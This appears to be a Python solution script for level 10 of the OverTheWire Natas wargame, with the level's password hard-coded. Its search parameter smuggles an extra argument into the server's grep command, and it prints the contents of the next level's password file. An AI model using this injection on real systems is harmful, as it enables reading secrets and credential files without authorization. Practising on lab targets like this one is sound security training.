#!/usr/bin/env python

import requests
import re
import base64

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = 'http://%s.natas.labs.overthewire.org/' % username

payload = {'needle': '".*" /etc/natas_webpass/natas11 #', 'submit': 'Search'}
r = requests.get(url, auth=(username, password), params=payload)

print(re.findall('\<pre\>\n(.*)\n\</pre\>', r.text)[0])